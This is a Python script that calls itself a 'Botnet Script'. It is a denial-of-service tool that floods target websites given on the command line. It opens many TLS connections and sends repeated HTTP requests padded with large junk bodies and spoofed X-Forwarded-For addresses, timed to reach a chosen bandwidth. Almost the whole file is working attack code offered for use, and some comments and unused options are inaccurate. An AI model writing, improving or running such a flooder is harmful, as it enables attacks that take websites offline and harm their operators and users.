
import asyncio
import sys
import urllib.parse
import ssl
import random
import socket
import socks
import time
import ipaddress
import aiohttp

# Зазначте вагу пакетів у мегабайтах
min_desired_bandwidth_mbps = 100  # Мінімальна вага пакета
max_desired_bandwidth_mbps = 500  # Максимальна вага пакета

method = ["POST ", "GET ", "PUT ", "DELETE ", "PATCH ", "OPTIONS "]
useragents = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Windows NT10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"]

pps, cps = 0, 0

global_channels = []

def generate_bot_ip():
    return str(ipaddress.IPv4Address(random.randint(0, 2**32)))

def generate_bot_request(url, payload_size_kb):
    bot_ip = generate_bot_ip()
    payload_size_bytes = int(payload_size_kb * 2048)
    payload = "A" * payload_size_bytes  # Генерація великого обсягу даних
    return (
        f"{random.choice(method)}{url.path or '/'} HTTP/1.1\r\n"
        f"Host: {url.hostname}\r\n"
        f"X-Forwarded-For: {bot_ip}\r\n"
        f"User-Agent: {random.choice(useragents)}\r\n"
        f"Content-Length: {payload_size_bytes}\r\n"  # Додавання заголовку Content-Length
        f"\r\n"
        f"{payload}\r\n"  # Додавання даних до запиту
    ).encode('latin-1')

async def bot_connect(url, rpc, request_interval, channel_index, use_proxy=False):
    global cps, pps
    context = ssl.SSLContext(ssl.PROTOCOL_TLS)  # Use TLS 1.3
    context.options |= ssl.OP_NO_SSLv2
    context.options |= ssl.OP_NO_SSLv3
    reader, writer = await asyncio.open_connection(url.hostname, url.port or 443, ssl=context)
    cps += 1
    
    # Додайте канал до списку глобальних каналів
    global_channels.append(channel_index)

    for _ in range(rpc):
        request_payload = generate_bot_request(url, random.uniform(1, 10))  # Генерація ваги від 1 до 10 кілобайт
        writer.write(request_payload)
        await writer.drain()
        pps += 1
        await asyncio.sleep(request_interval)

    # При завершенні з'єднання видаліть канал зі списку
    global_channels.remove(channel_index)

async def botnet_main():
    site_urls = sys.argv[1].split()  # Розділіть введені URL сайтів
    num_bots = int(sys.argv[2])
    rpc = int(sys.argv[3])
    
    # Обчислення інтервалу на основі бажаної пропускної здатності
    min_request_interval = 1 / max_desired_bandwidth_mbps
    max_request_interval = 1 / min_desired_bandwidth_mbps

    random.seed()  # Seed random number generator
    
    connector = aiohttp.TCPConnector(limit_per_host=num_bots)  # Set the maximum number of connections per host
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for site_url in site_urls:
            url = urllib.parse.urlsplit(site_url)
            for i in range(num_bots):
                request_interval = random.uniform(min_request_interval, max_request_interval)
                use_proxy = random.choice([True, False])  # Use proxy for some bots
                tasks.append(bot_connect(url, rpc, request_interval, i, use_proxy))
        await asyncio.gather(*tasks)
    
    # Після завершення всіх задач перевірте, який з каналів був розірваний
    if len(global_channels) < num_bots:
        print("One or more channels were disconnected.")

if len(sys.argv) != 4:
    exit("python3 %s <site_urls> <num_bots> <rpc>" % sys.argv[0])

if __name__ == "__main__":
    # Додайте гарне консольне меню і вказання автора
    print("Welcome to the Botnet Script")
    print("Author: @zemondza")
    print("----------------------------")
    asyncio.run(botnet_main())
